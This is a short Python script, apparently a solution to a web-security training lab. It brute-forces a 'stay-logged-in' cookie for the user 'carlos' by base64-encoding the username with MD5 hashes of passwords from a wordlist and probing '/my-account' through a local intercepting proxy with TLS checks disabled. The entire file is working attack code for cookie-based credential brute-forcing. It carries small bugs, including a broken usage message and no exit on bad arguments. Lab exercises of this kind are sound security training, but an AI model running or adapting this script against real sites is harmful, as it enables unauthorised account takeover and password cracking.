import requests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup
import re
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def encode_password(password):
	
	cookie = "carlos:"+hashlib.md5(password.encode('utf-8')).hexdigest()
	message_bytes = cookie.encode('ascii')
	return base64.b64encode(message_bytes).decode()
	# base64_message = base64_bytes.decode('utf8')
	# return re.findall(r'(\w+)=(\w+)', res.headers['Set-Cookie'])[0][1]

def brute_force_cookie(url):
	with open('../password_list.txt') as p:
		passwords = p.readlines()
	for password in passwords:
		print(password.strip("\n"))
		stay_logged_in = encode_password(password.strip("\n"))
		print(stay_logged_in)

		headers = {"Cookie": "stay-logged-in=%s" % stay_logged_in}
		r = requests.get(url+"/my-account", verify=False, proxies=proxies, headers=headers, allow_redirects=False)
		
		if r.status_code != 302:
			print("Password is %s.. stayed-logged-in: %s" % (password.strip("\n"), stay_logged_in))
			return
		
	# csrf = soup.body.find_all('input',{"name":"csrf"})[0].get("value")
	
	

def main():
	if len(sys.argv) != 2:
		print("(-) usage %s <url>" % sys.argv[0])
		print("(-) Example: %s www.example.com" % sys.argv[1])

	url = sys.argv[1]
	print("(+) Brute force cookie")
	brute_force_cookie(url)
	
	
	
if __name__ == "__main__":
	main()